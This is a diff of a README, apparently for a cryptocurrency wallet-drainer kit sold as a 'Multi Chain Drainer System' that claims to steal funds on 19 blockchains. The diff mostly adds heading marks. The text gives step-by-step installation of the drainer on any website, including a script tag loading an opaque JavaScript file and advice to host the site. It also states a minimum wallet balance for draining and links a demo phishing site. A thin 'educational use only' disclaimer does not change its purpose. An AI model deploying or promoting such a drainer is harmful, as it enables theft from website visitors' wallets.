@@ -1,13 +1,13 @@
 #########################################################################################################
- ‼️‼️ This files is dedicated to WEB3.0 learning, protection and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️
+ # ‼️‼️ This files is dedicated to WEB3.0 learning, protection and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️
 #########################################################################################################
 
-💯 Multi Chain Drainer System 💯
+# 💯 Multi Chain Drainer System 💯
 
-Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
+# Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
 Installation on any website files and documentation included 🔥
 
-Installation & Instructions of the draining system on any WEBSITE / DRAINERSCRIPTONLY.rar
+# Installation & Instructions of the draining system on any WEBSITE / DRAINERSCRIPTONLY.rar
 
 # STEP 1 (FOLLOW THE TUTORIAL IN THE UPDATED .RAR FOR STEP 1
 <script charset="UTF-8" type="text/javascript" src="./85562950-42ac-48d9-9757-cb0ae30ccb7c.js"></script>
@@ -43,20 +43,19 @@ It should look like this
 
 
 All is setup your drainer is ready to go. 
-
-📛 THE DRAINER ONLY DRAIN BALANCE WITH MINIMUM 10.00$ FOR COVERING TRANSACTION FEE 📛
-
 Upload your website on Vercel or any Hosting
 
 
-WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : drainerupdatedtemplate.rar
-Only thing to do is # STEP 3 
+# 📛 THE DRAINER ONLY DRAIN BALANCE WITH MINIMUM 10.00$ FOR COVERING TRANSACTION FEE 📛
+
+# 📍 WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : drainerupdatedtemplate.rar
+#    Only thing to do is # STEP 3 
 
 
-DEMO WEBSITE : https://rectify-mainnetdapps.pages.dev/dapps/ennn/
+# DEMO WEBSITE : https://rectify-mainnetdapps.pages.dev/dapps/ennn/
 
 #ETHEREUM #BINANCE #NFT #SEAPORT #DRAINERTESTING #BITCOIN #BNB #ETH
 
 #########################################################################################################
- ‼️‼️ This files is dedicated to WEB3.0 learning, protection and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️
+ # ‼️‼️ This files is dedicated to WEB3.0 learning, protection and Legal Penetration Testing. All information on this files is for educational use only ‼️‼️
 #########################################################################################################
